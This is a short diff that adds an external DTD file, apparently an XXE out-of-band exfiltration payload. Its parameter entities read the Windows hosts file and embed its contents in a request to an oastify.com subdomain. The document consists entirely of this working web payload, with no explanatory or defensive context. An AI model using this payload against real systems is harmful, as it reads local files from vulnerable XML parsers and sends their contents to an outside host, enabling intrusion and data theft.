@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.2z2r7lvzorntpwn8rac7bv9h086zurufj.oastify.com/'>">
+%eval;
+%exfil;
